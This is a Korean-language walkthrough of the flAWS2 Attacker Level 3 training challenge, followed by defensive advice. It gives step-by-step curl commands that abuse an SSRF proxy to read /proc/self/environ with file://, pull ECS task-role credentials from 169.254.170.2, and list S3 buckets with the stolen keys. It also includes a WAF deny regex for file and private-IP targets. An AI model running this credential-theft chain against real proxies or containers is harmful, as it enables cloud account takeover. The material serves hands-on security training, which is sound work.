# Attacker Level 3 — 프록시 SSRF 로 ECS Task Role 자격증명 탈취

> **설명 페이지**: http://level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud/
> **프록시 서버**: http://container.target.flaws2.cloud/proxy/
> **핵심 기술**: SSRF · ECS Fargate Task Metadata · `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`
> **난이도**: ⭐⭐⭐
> **본인 AWS 계정 필요**: ❌

## 🎯 목표

Level 2 에서 통과한 컨테이너의 `proxy.py` 가 **임의 URL 을 대신 페치**해 준다는 걸 이용한다. `file://` 으로 **컨테이너 내부 `/proc/self/environ`** 을 읽어 `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` 를 알아내고, ECS Task Metadata Endpoint 로 **Task Role 의 임시 자격증명** 을 탈취하여 최종 플래그 버킷에 도달한다.

## 🧭 공식 힌트

<details>
<summary><b>Hint 1</b></summary>

> 프록시는 Level 2 에서 통과한 컨테이너 안에 있는 **Python `urllib`** 입니다. `http://` 외 다른 스킴도 됩니다.

</details>

<details>
<summary><b>Hint 2</b></summary>

> 컨테이너의 자격증명 경로는 환경변수 `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` 에 있습니다. 환경변수는 `/proc/self/environ` 에 있죠.

</details>

<details>
<summary><b>Hint 3</b></summary>

> 그 경로를 `169.254.170.2$URI` 형태로 조합해 프록시로 요청하면 Task Role 의 `ASIA...` 키가 돌아옵니다. 그 키로 `aws s3 ls` 를 하세요.

</details>

## 📚 사전 지식

- ECS (EC2/Fargate) 는 IMDS 가 아니라 **Task Metadata Endpoint `169.254.170.2`** 에서 자격증명을 받는다.
- 실제 자격증명 경로는 랜덤 UUID 가 포함된 `/v2/credentials/<uuid>` 이고 **env 로만 주어진다** (`AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`).
- Python `urllib.urlopen(url)` 에 `file://` URL 을 주면 로컬 파일을 읽을 수 있다 — **URL 스킴 화이트리스트**가 없는 프록시에서 치명적.

## 🔍 정찰

### 1. 프록시 기본 동작 확인
```bash
curl -sI "http://container.target.flaws2.cloud/proxy/http://flaws2.cloud/" | head -3
# HTTP/1.1 200 OK
```

### 2. ECS 컨테이너 메타데이터(기본적으로 아무나 접근 가능)
```bash
curl -s "http://container.target.flaws2.cloud/proxy/http://169.254.170.2/v2/metadata" | jq '.Containers[0].Labels'
# "com.amazonaws.ecs.cluster": "arn:aws:ecs:us-east-1:653711331788:cluster/level3", ...
```
ECS Fargate 에서 돌고 있는 `level3` 태스크임을 확인.

### 3. 자격증명 루트 호출 — UUID 없어서 실패
```bash
curl -s "http://container.target.flaws2.cloud/proxy/http://169.254.170.2/v2/credentials/"
# {"code":"NoIdInRequest","message":"CredentialsV2Request: No Credential ID in the request","HTTPErrorCode":400}
```
UUID 를 알아야 한다.

## 🧨 취약점 원리

- 프록시가 `file://` 등 **비-HTTP 스킴을 거르지 않음** → 로컬 파일 노출.
- 컨테이너 환경변수는 데이터 레벨로 보호되지만 **`/proc/self/environ`** 은 같은 프로세스라면 누구나 읽을 수 있다.
- Task Role 의 자격증명 URI 를 알면 **네트워크 내부로 요청** 해서 ASIA 키 발급.

## 🛠 풀이

### 1. `file://` 로 환경변수 읽기
```bash
curl -s "http://container.target.flaws2.cloud/proxy/file:///proc/self/environ" \
  | tr '\0' '\n' | grep AWS_CONTAINER
# AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/c897437e-0f25-4908-85cb-3be62175270e
```
> 💡 `/proc/self/environ` 은 **NULL 바이트** 로 변수를 구분한다. `tr '\0' '\n'` 으로 한 줄씩 분리.

### 2. URI 를 `169.254.170.2` 에 붙여 자격증명 요청
```bash
URI="/v2/credentials/c897437e-0f25-4908-85cb-3be62175270e"   # 사람마다 값이 다름
curl -s "http://container.target.flaws2.cloud/proxy/http://169.254.170.2${URI}" > /tmp/l3creds.json
cat /tmp/l3creds.json
```
출력:
```json
{
  "RoleArn": "arn:aws:iam::653711331788:role/level3",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2026-04-18T08:12:09Z"
}
```

### 3. 자격증명 환경변수 설정 & 계정 확인
```bash
jq -r '"export AWS_ACCESS_KEY_ID=\(.AccessKeyId)
export AWS_SECRET_ACCESS_KEY=\(.SecretAccessKey)
export AWS_SESSION_TOKEN=\(.Token)"' /tmp/l3creds.json > /tmp/l3creds.sh
source /tmp/l3creds.sh
aws sts get-caller-identity --region us-east-1
# Arn: arn:aws:sts::653711331788:assumed-role/level3/<task-uuid>
```

### 4. S3 리스팅 — 최종 버킷 찾기
```bash
aws s3 ls --region us-east-1
```
예상:
```
2018-11-21 04:50:08 flaws2.cloud
...
2018-11-28 05:37:27 the-end-962b72bjahfm5b4wcktm8t9z4sapemjb.flaws2.cloud
```

### 5. The End 방문
```bash
curl -s http://the-end-962b72bjahfm5b4wcktm8t9z4sapemjb.flaws2.cloud/ \
  | grep -i 'congrats\|the end'
# <h1>The End</h1>
# Congrats! You completed the attacker path of flAWS 2!
```

## 🚪 정답 & 완주

<details>
<summary>정답 펼치기</summary>

- 최종: **http://the-end-962b72bjahfm5b4wcktm8t9z4sapemjb.flaws2.cloud/**
- 교훈:
  - 프록시 앱은 **URL 스킴 + 호스트** 두 단계로 화이트리스트.
  - 컨테이너/Fargate 는 IMDS 가 없지만 **대응되는 metadata endpoint 가 있음**. 애플리케이션 레벨 SSRF 방어는 EC2 든 ECS 든 **같은 사설 IP 대역**을 모두 커버해야 한다.

</details>

## 🌍 실제 세계 사례

- 2020 년 여러 CTF 에서 동일 구조(SSRF → 169.254.170.2 → Task Role) 가 반복 등장.
- 컨테이너 웹 프록시·URL fetcher·웹훅 수신기 중 하나가 자주 원인.

## 🛡 방어 대책

### ① 애플리케이션에서 스킴·사설 IP 차단
```python
from urllib.parse import urlparse
from ipaddress import ip_address
import socket

def is_safe(url: str) -> bool:
    u = urlparse(url)
    if u.scheme not in ("http", "https"):
        return False
    ip = ip_address(socket.gethostbyname(u.hostname))
    return ip.is_global  # 링크로컬·사설·루프백 모두 False
```
- DNS rebinding 방지: 한 번 해석한 IP 로만 실제 연결

### ② Fargate Task Role 최소권한
- `s3:ListAllMyBuckets` · 전체 리스팅은 **절대 기본값으로 주지 말 것**
- `Resource` 를 구체 버킷으로 제한

### ③ ECS Task Metadata 의 사이드카 프록시
- AWS `aws-sdk-credential-provider-proxy` 또는 `amazon-ssm-agent` 사이드카로 감싸 SDK 외 호출을 차단.

### ④ GuardDuty Runtime Monitoring (ECS)
비정상 HTTP 요청·파일 접근을 탐지.

### ⑤ WAF / 프록시 입력 필터
```
# 정규식 Deny
Pattern: target_url matches /^(file|169\.254\.|127\.|10\.|172\.1[6-9]\.|172\.2\d\.|172\.3[0-1]\.|192\.168\.)/
```

## ✅ 체크리스트

- [ ] 프록시 `/proxy/file:///proc/self/environ` 로 환경변수 노출 성공
- [ ] `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` 값 추출
- [ ] 그 URI 로 Task Role `ASIA...` 키 획득
- [ ] `aws s3 ls` 로 `the-end-...` 버킷 식별
- [ ] 본인 Fargate 태스크에서 위 Python 스킴 필터 적용 실습

## ⏭ 다음

[← Attacker L2](level-02.md) · [Defender 트랙 시작 →](../defender/level-01.md)
